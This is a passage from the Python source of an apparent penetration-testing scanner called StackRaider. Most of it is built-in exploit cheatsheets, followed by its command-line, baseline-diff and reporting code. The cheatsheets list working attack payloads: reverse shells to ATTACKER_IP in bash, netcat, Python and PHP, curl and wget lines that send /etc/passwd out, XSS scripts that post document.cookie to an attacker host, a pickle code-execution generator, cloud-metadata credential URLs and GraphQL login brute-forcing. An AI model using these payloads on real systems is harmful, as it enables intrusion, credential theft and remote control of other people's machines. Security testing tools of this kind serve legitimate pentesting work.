sqlmap -u "http://target.com/?id=1" --os-shell
""",

    'cmdi': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  COMMAND INJECTION CHEATSHEET                                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid

BLIND DETECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
; sleep 5
| sleep 5
& ping -c 5 127.0.0.1 &
`sleep 5`

OUT-OF-BAND:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
; curl http://ATTACKER_IP/$(whoami)
; wget http://ATTACKER_IP/?$(cat /etc/passwd | base64)
; nslookup $(whoami).ATTACKER_DOMAIN

REVERSE SHELLS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Netcat
; nc -e /bin/sh ATTACKER_IP 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Python
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'cat\\x20/etc/passwd'&&$X

# Quote bypass
c''at /etc/passwd
c""at /etc/passwd
""",

    'lfi': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  LOCAL FILE INCLUSION (LFI) CHEATSHEET                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd    (double encoding)
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

INTERESTING FILES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/auth.log
~/.ssh/id_rsa
~/.bash_history
/var/www/html/config.php

# Windows
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\System32\\config\\SYSTEM
C:\\Windows\\win.ini
C:\\inetpub\\wwwroot\\web.config
C:\\inetpub\\logs\\LogFiles\\

PHP WRAPPERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Read source code (base64 encoded)
php://filter/convert.base64-encode/resource=index.php

# RCE via expect
expect://id

# RCE via input (POST data contains PHP code)
php://input

# RCE via data
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

LOG POISONING TO RCE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Inject PHP into log: User-Agent: <?php system($_GET['c']); ?>
2. Include the log: ?page=/var/log/apache2/access.log&c=id
""",

    'ssrf': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  SERVER-SIDE REQUEST FORGERY (SSRF) CHEATSHEET                               ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://0/
http://127.1/

CLOUD METADATA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AWS (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# AWS (IMDSv2 - need token)
curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT http://169.254.169.254/latest/api/token

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/ (with header Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Decimal IP
http://2130706433/ (= 127.0.0.1)

# Hex IP
http://0x7f000001/ (= 127.0.0.1)

# URL encoding
http://127.0.0.1%00@evil.com/
http://evil.com@127.0.0.1/

# DNS rebinding
Use rebinder.io - first request resolves to allowed, second to internal

# Redirect bypass
http://attacker.com/redirect?url=http://169.254.169.254/

PROTOCOL SMUGGLING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall  (Redis)
file:///etc/passwd
dict://127.0.0.1:11211/stats  (Memcached)
""",

    'xss': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  CROSS-SITE SCRIPTING (XSS) CHEATSHEET                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>

EVENT HANDLERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<div onmouseover="alert(1)">hover me</div>
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">

BYPASS FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Case variation
<ScRiPt>alert(1)</ScRiPt>

# Without parentheses
<img src=x onerror=alert`1`>

# Without spaces
<svg/onload=alert(1)>

# HTML encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

# URL encoding in javascript:
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert%281%29">click</a>

# Unicode
<script>\\u0061lert(1)</script>

COOKIE STEALING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<script>new Image().src="http://ATTACKER/steal?c="+document.cookie;</script>
<script>fetch('http://ATTACKER/steal?c='+document.cookie)</script>

DOM XSS SOURCES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
document.URL, document.location, document.referrer, window.name
location.hash, location.search, localStorage, sessionStorage
""",

    'jwt': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  JWT (JSON WEB TOKEN) ATTACKS CHEATSHEET                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

JWT STRUCTURE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.xxx

NONE ALGORITHM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Change header: {"alg":"none"}
2. Modify payload: {"user":"admin","admin":true}
3. Remove signature: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

Variants: none, None, NONE, nOnE

ALGORITHM CONFUSION (RS256 → HS256):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
If server uses RS256 (asymmetric) but accepts HS256 (symmetric):
1. Get the public key
2. Change alg to HS256
3. Sign with public key as secret

SECRET BRUTE FORCE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Using hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# Common weak secrets
secret, password, 123456, jwt_secret, changeme, your-256-bit-secret

KID INJECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Path traversal
{"alg":"HS256","kid":"../../../../../../dev/null"}
# SQL injection
{"alg":"HS256","kid":"1' UNION SELECT 'secret'--"}

TOOLS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
jwt_tool: python3 jwt_tool.py <JWT> -T    # Tamper
jwt_tool: python3 jwt_tool.py <JWT> -X a  # All attacks
jwt.io: Online decoder/encoder
flask-unsign: For Flask session cookies (similar to JWT)
""",

    'deser': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  DESERIALIZATION ATTACKS CHEATSHEET                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

PHP UNSERIALIZE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Magic methods: __wakeup, __destruct, __toString
# Tools: PHPGGC for gadget chains

phpggc -l                              # List gadgets
phpggc Laravel/RCE1 system 'id'        # Generate payload

PYTHON PICKLE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import pickle, base64, os

class Payload:
    def __reduce__(self):
        return (os.system, ('id',))

print(base64.b64encode(pickle.dumps(Payload())).decode())

PYTHON YAML:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
!!python/object/apply:os.system ['id']
!!python/object/new:subprocess.check_output [['id']]

JAVA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Tools: ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Common gadgets: CommonsCollections1-7, Spring1, Hibernate1

# Detection: Look for base64 starting with rO0AB (Java serialized)

NODE.JS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# node-serialize RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

# Via IIFE
_$$ND_FUNC$$_function(){...}()
""",

    'graphql': """
╔══════════════════════════════════════════════════════════════════════════════╗
║  GRAPHQL EXPLOITATION CHEATSHEET                                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

ENDPOINT DISCOVERY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/graphql    /graphiql    /playground    /v1/graphql    /api/graphql
/query      /gql         /graphql/console             /altair

# Fingerprint - returns {"data":{"__typename":"Query"}} if GraphQL
curl -X POST http://target/graphql -H "Content-Type: application/json" \\
  -d '{"query":"{ __typename }"}'

INTROSPECTION (FULL SCHEMA DUMP):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Quick type listing
{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}

# Full introspection
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name kind description
      fields { name type { name kind ofType { name } }
               args { name type { name kind } } }
    }
  }
}

# List all queries
{__schema{queryType{fields{name description args{name type{name kind}}}}}}

# List all mutations
{__schema{mutationType{fields{name description args{name type{name kind}}}}}}

# If introspection is disabled, try Clairvoyance for wordlist-based recovery:
# python clairvoyance.py -u http://target/graphql -w wordlist.txt

INJECTION THROUGH ARGUMENTS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# SQL Injection
{ user(name: "' OR 1=1 --") { id email } }
{ user(id: "1 UNION SELECT username,password FROM users --") { name } }

# NoSQL Injection (if MongoDB backend)
{ user(search: "{\\"$ne\\": \\"\\"}") { name email } }

# SSRF via URL arguments
{ fetchUrl(url: "http://169.254.169.254/latest/meta-data/") { content } }

AUTHORIZATION BYPASS (BOLA/IDOR):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Enumerate objects by ID
{ user(id: 1) { name email ssn } }
{ user(id: 2) { name email ssn } }

# Batch enumerate with aliases
{
  u1: user(id: "1") { name email role }
  u2: user(id: "2") { name email role }
  u3: user(id: "3") { name email role }
}

# Access admin mutations as regular user
mutation { updateRole(userId: "2", role: ADMIN) { id role } }
mutation { deleteUser(id: "1") { success } }

DENIAL OF SERVICE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Deep nesting (query depth attack)
{ user(id:1) { friends { friends { friends { friends { friends {
  name } } } } } } }

# Wide query with field duplication
{ users { name email name email name email name email } }

# Alias-based resource exhaustion
{
  a1: expensiveQuery { result }
  a2: expensiveQuery { result }
  a3: expensiveQuery { result }
  # ... repeat 100x
}

# Circular fragment (if server doesn't detect cycles)
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{ user(id:1) { ...A } }

BATCHING ATTACKS (RATE LIMIT BYPASS):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# HTTP batching - multiple operations in one request
curl -X POST http://target/graphql -H "Content-Type: application/json" \\
  -d '[
    {"query":"mutation{login(u:\\"admin\\",p:\\"pass1\\"){token}}"},
    {"query":"mutation{login(u:\\"admin\\",p:\\"pass2\\"){token}}"},
    {"query":"mutation{login(u:\\"admin\\",p:\\"pass3\\"){token}}"}
  ]'

# Alias batching - multiple operations in one query (always works)
mutation {
  a1: login(username:"admin", password:"pass1") { token }
  a2: login(username:"admin", password:"pass2") { token }
  a3: login(username:"admin", password:"pass3") { token }
}

MASS ASSIGNMENT VIA MUTATIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Try setting privileged fields in input types
mutation {
  updateProfile(input: {
    name: "Attacker"
    role: "admin"           # Hidden field?
    isAdmin: true           # Hidden field?
    verified: true          # Hidden field?
  }) { id name role }
}

# Register with extra fields
mutation {
  register(input: {
    email: "attacker@test.com"
    password: "test123"
    role: "ADMIN"
  }) { id role }
}

CSRF ON GRAPHQL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# If GraphQL accepts GET requests with query param:
<img src="http://target/graphql?query=mutation{deleteMyAccount{ok}}">

# If GraphQL accepts application/x-www-form-urlencoded:
<form action="http://target/graphql" method="POST">
  <input name="query" value='mutation{changeEmail(email:"attacker@evil.com"){ok}}'>
</form>
<script>document.forms[0].submit()</script>

TOOLS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- InQL (Burp Extension): Schema analysis & query generation
- graphql-cop: Automated security audit (python graphql-cop -t URL)
- Clairvoyance: Schema recovery without introspection
- BatchQL: Batching attack automation
- graphql-path-enum: Enumerate paths between types
- Altair/Insomnia: Interactive GraphQL clients for testing
""",
}


def print_cheatsheet(topic: str):
    """Print exploitation cheatsheet for given topic."""
    topic = topic.lower()
    
    if topic == 'list':
        print(f"\\n{Colors.BOLD}Available Cheatsheet Topics:{Colors.RESET}\\n")
        topics = {
            'ssti': 'Server-Side Template Injection (Jinja2, Twig, etc.)',
            'sqli': 'SQL Injection (MySQL, PostgreSQL, SQLite)',
            'cmdi': 'Command Injection (Linux/Windows)',
            'lfi': 'Local File Inclusion / Path Traversal',
            'ssrf': 'Server-Side Request Forgery',
            'xss': 'Cross-Site Scripting',
            'jwt': 'JWT Token Attacks',
            'deser': 'Deserialization (PHP, Python, Java, Node)',
            'graphql': 'GraphQL API Exploitation (Introspection, DoS, BOLA, Batching)',
        }
        for key, desc in topics.items():
            print(f"  {Colors.BOLD}{key:8}{Colors.RESET} - {desc}")
        print(f"\\n{Colors.DIM}Usage: scanner.py --cheatsheet <topic>{Colors.RESET}\\n")
        return
    
    if topic in CHEATSHEETS:
        print(CHEATSHEETS[topic])
    else:
        print(f"{Colors.CRITICAL}Unknown topic: {topic}{Colors.RESET}")
        print(f"Use --cheatsheet list to see available topics.")


def _finding_key(f) -> Tuple[str, str]:
    """Stable identity key for a finding (rule_id, file_path)."""
    return (f['rule_id'] if isinstance(f, dict) else f.rule_id,
            f['file_path'] if isinstance(f, dict) else f.file_path)


def _finding_key_with_line(f, tolerance: int = 5) -> Tuple[str, str, int]:
    """Identity key bucketed by line number (tolerance-based fuzzy match)."""
    line = f['line_number'] if isinstance(f, dict) else f.line_number
    return (f['rule_id'] if isinstance(f, dict) else f.rule_id,
            f['file_path'] if isinstance(f, dict) else f.file_path,
            line // tolerance)


def diff_baseline(current: ScanResult, baseline_path: str) -> Dict:
    """Compare current scan against a baseline JSON export.

    Returns dict with keys: new, fixed, unchanged (lists of findings/dicts).
    """
    with open(baseline_path, 'r') as fh:
        baseline = json.load(fh)

    baseline_findings = baseline.get('findings', [])

    # Build lookup of baseline findings by fuzzy key
    baseline_map: Dict[Tuple, List[Dict]] = defaultdict(list)
    for bf in baseline_findings:
        key = _finding_key_with_line(bf)
        baseline_map[key].append(bf)

    new_findings: List[Finding] = []
    unchanged_findings: List[Finding] = []
    matched_baseline_keys: Set[Tuple] = set()

    for finding in current.findings:
        key = _finding_key_with_line(finding)
        if key in baseline_map:
            matched_baseline_keys.add(key)
            unchanged_findings.append(finding)
        else:
            new_findings.append(finding)

    fixed_findings: List[Dict] = []
    for bf in baseline_findings:
        key = _finding_key_with_line(bf)
        if key not in matched_baseline_keys:
            fixed_findings.append(bf)

    return {
        'new': new_findings,
        'fixed': fixed_findings,
        'unchanged': unchanged_findings,
    }


def print_baseline_report(diff: Dict, color: bool = True):
    """Print a diff summary comparing current scan to baseline."""
    c = Colors if color else NoColors

    new = diff['new']
    fixed = diff['fixed']
    unchanged = diff['unchanged']

    print(f"\n{'═' * 70}")
    print(f"{c.BOLD}BASELINE COMPARISON{c.RESET}")
    print(f"{'═' * 70}\n")

    print(f"  {c.CRITICAL}NEW findings:       {len(new)}{c.RESET}")
    print(f"  {c.SUCCESS}FIXED findings:     {len(fixed)}{c.RESET}")
    print(f"  {c.DIM}Unchanged findings: {len(unchanged)}{c.RESET}")
    print()

    if new:
        print(f"  {c.BOLD}{c.CRITICAL}── NEW (not in baseline) ──{c.RESET}\n")
        for i, f in enumerate(new, 1):
            sev_color = SEVERITY_COLORS.get(Severity[f.severity], '') if color else ''
            print(f"  {c.CRITICAL}[NEW]{c.RESET} {sev_color}[{f.severity}]{c.RESET} {f.rule_name}")
            print(f"        {f.file_path}:{f.line_number}")
        print()

    if fixed:
        print(f"  {c.BOLD}{c.SUCCESS}── FIXED (in baseline but no longer present) ──{c.RESET}\n")
        for i, f in enumerate(fixed, 1):
            rule_name = f.get('rule_name', f.get('rule_id', '?'))
            severity = f.get('severity', '?')
            print(f"  {c.SUCCESS}[FIXED]{c.RESET} [{severity}] {rule_name}")
            print(f"         {f.get('file_path', '?')}:{f.get('line_number', '?')}")
        print()


def print_banner():
    """Print the tool banner."""
    W = 64
    bar = '═' * W
    print()
    print(f"{Colors.BOLD}{Colors.CRITICAL}", end="")
    print(f"   ╔{bar}╗")
    print(f"   ║{'  WEB APP SECURITY SCANNER - Penetration Testing Tool':<{W}}║")
    print(f"   ╠{bar}╣")
    print(f"   ║{'  Supports: JavaScript, TypeScript, PHP, Python':<{W}}║")
    print(f"   ║{'  Detects vulnerabilities and provides exploitation guidance':<{W}}║")
    print(f"   ╚{bar}╝")
    print(f"{Colors.RESET}")
    print(f"   {Colors.DIM}Rules: {ALL_TOTAL_RULES} | Categories: {len(ALL_CATEGORIES)} | Offline Mode{Colors.RESET}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description='Multi-Language Security Scanner for Penetration Testing (JS/TS/PHP)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s /path/to/project                    # Scan JS/TS/PHP/Python files
  %(prog)s . --severity HIGH                   # Only HIGH and CRITICAL
  %(prog)s . --output report.json              # Export to JSON
  %(prog)s . --html report.html --csv out.csv  # Export to HTML and CSV
  %(prog)s . --brief                           # Quick summary output
  %(prog)s . --include-vendor                  # Include vendor directories
  %(prog)s . --grep "password|secret|api_key"  # Search for custom patterns
  %(prog)s --cheatsheet ssti                   # Show SSTI exploit cheatsheet
  %(prog)s --list-rules                        # List all detection rules
        '''
    )
    
    parser.add_argument('path', nargs='?', help='Path to scan (file or directory)')
    parser.add_argument('-s', '--severity', choices=['INFO', 'LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
                        default='INFO', help='Minimum severity level to report (default: INFO)')
    parser.add_argument('-o', '--output', help='Export results to JSON file')
    parser.add_argument('--html', help='Export results to HTML report')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Show verbose output including remediation')
    parser.add_argument('--no-exploitation', action='store_true',
                        help='Hide exploitation guidance')
    parser.add_argument('--no-color', action='store_true',
                        help='Disable colored output')
    parser.add_argument('--exclude-rules', help='Comma-separated list of rule IDs to exclude')
    parser.add_argument('-w', '--workers', type=int, default=4,
                        help='Number of parallel workers (default: 4)')
    parser.add_argument('--unminify', action='store_true',
                        help='Auto-detect and unminify minified JS files before scanning')
    parser.add_argument('--include-vendor', action='store_true',
                        help='Include vendor/third-party directories in scan (normally skipped)')
    parser.add_argument('--brief', action='store_true',
                        help='Brief output - show only finding locations without details')
    parser.add_argument('--no-attack-surface', action='store_true',
                        help='Hide the attack surface map (shown by default when routes are discovered)')
    parser.add_argument('--secrets', action='store_true',
                        help='Show a copy-paste ready inventory of discovered secrets and credentials')
    parser.add_argument('--csv', help='Export results to CSV file')
    parser.add_argument('--urls', metavar='FILE', help='Export discovered routes as a URL list for fuzzing')
    parser.add_argument('--burp', metavar='FILE', help='Export discovered routes as Burp Suite sitemap XML')
    parser.add_argument('--baseline', metavar='JSON_FILE',
                        help='Compare against a previous JSON scan to show NEW/FIXED/CHANGED findings')
    parser.add_argument('--grep', metavar='PATTERN',
                        help='Search for custom regex pattern in files (outputs matches with context)')
    parser.add_argument('--cheatsheet', metavar='TOPIC', nargs='?', const='list',
                        help='Show exploit cheatsheet (topics: ssti, sqli, cmdi, lfi, ssrf, xss, jwt, deser, list)')
    parser.add_argument('--list-rules', action='store_true',
                        help='List all available rules and exit')
    parser.add_argument('--web', action='store_true',
                        help='Launch StackRaider web UI (code + GraphQL + LLM)')
    parser.add_argument('--port', type=int, default=8000,
                        help='Port for web UI server (default: 8000)')
    
    args = parser.parse_args()
    
    # Cheatsheet mode
    if args.cheatsheet:
        print_cheatsheet(args.cheatsheet)
        return 0
    
    # List rules mode
    if args.list_rules:
        print(f"\n{Colors.BOLD}Available Security Rules ({ALL_TOTAL_RULES} total):{Colors.RESET}\n")
        
        print(f"  {Colors.UNDERLINE}JavaScript/TypeScript Rules ({TOTAL_RULES}):{Colors.RESET}\n")
        for rule in SECURITY_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        
        print(f"\n  {Colors.UNDERLINE}PHP Rules ({PHP_TOTAL_RULES}):{Colors.RESET}\n")
        for rule in PHP_SECURITY_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        
        print(f"\n  {Colors.UNDERLINE}Python Rules ({PYTHON_TOTAL_RULES}):{Colors.RESET}\n")
        for rule in PYTHON_SECURITY_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        
        print(f"\n  {Colors.UNDERLINE}GraphQL Rules ({GRAPHQL_TOTAL_RULES}):{Colors.RESET}\n")
        for rule in GRAPHQL_JS_RULES + GRAPHQL_PYTHON_RULES + GRAPHQL_PHP_RULES:
            sev_color = SEVERITY_COLORS.get(rule.severity, '')
            print(f"  {sev_color}[{rule.id}]{Colors.RESET} {rule.name}")
            print(f"         Category: {rule.category} | {rule.cwe_id}")
            print()
        return 0
    
    # Web UI mode
    if args.web:
        try:
            from stackraider.web.server import start as start_web
        except ImportError as e:
            print(f"{Colors.CRITICAL}Web UI requires dependencies. Run: pip install -r requirements.txt{Colors.RESET}")
            print(f"{Colors.DIM}  {e}{Colors.RESET}")
            return 1
        if args.path and not os.path.exists(args.path):
            print(f"{Colors.CRITICAL}Error: Path does not exist: {args.path}{Colors.RESET}")
            return 1
        start_web(path=args.path, port=args.port, open_browser=True)
        return 0

    # Validate path is provided
    if not args.path:
        print(f"{Colors.CRITICAL}Error: Path argument is required. Use -h for help.{Colors.RESET}")
        return 1
    
    # Validate path exists
    if not os.path.exists(args.path):
        print(f"{Colors.CRITICAL}Error: Path does not exist: {args.path}{Colors.RESET}")
        return 1
    
    # Grep mode - custom pattern search
    if args.grep:
        all_extensions = SecurityScanner.SUPPORTED_EXTENSIONS
        grep_files(args.path, args.grep, all_extensions, args.include_vendor)
        return 0
    
    print_banner()
    
    # Configure scanner
    config = {
        'min_severity': args.severity,
        'exclude_rules': args.exclude_rules.split(',') if args.exclude_rules else [],
        'unminify': args.unminify,
        'include_vendor': args.include_vendor
    }
    
    # Run scan
    scanner = SecurityScanner(args.path, config)
    result = scanner.scan(max_workers=args.workers)
    
    # Generate reports
    reporter = ReportGenerator()
    use_color = not args.no_color
    
    # Brief mode - minimal output
    if args.brief:
        reporter.print_brief(result, color=use_color)
    else:
        reporter.print_summary(result, color=use_color)
        if not args.no_attack_surface:
            reporter.print_attack_surface(result, color=use_color)
        reporter.print_findings(
            result,
            verbose=args.verbose,
            color=use_color,
            show_exploitation=not args.no_exploitation
        )
    
    if args.secrets:
        reporter.print_secrets(result, color=use_color)

    # Baseline comparison
    if args.baseline:
        if not os.path.exists(args.baseline):
            print(f"{Colors.CRITICAL}Error: Baseline file not found: {args.baseline}{Colors.RESET}")
        else:
            diff = diff_baseline(result, args.baseline)
            print_baseline_report(diff, color=use_color)

    # Export if requested
    if args.output:
        reporter.export_json(result, args.output)
    
    if args.html:
        reporter.export_html(result, args.html)
    
    if args.csv:
        reporter.export_csv(result, args.csv)
    
    if args.urls:
        reporter.export_urls(result, args.urls)
    
    if args.burp:
        reporter.export_burp(result, args.burp)
    
    # Exit code based on findings
    if result.findings_by_severity.get('CRITICAL', 0) > 0:
        return 2
    if result.findings_by_severity.get('HIGH', 0) > 0:
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())

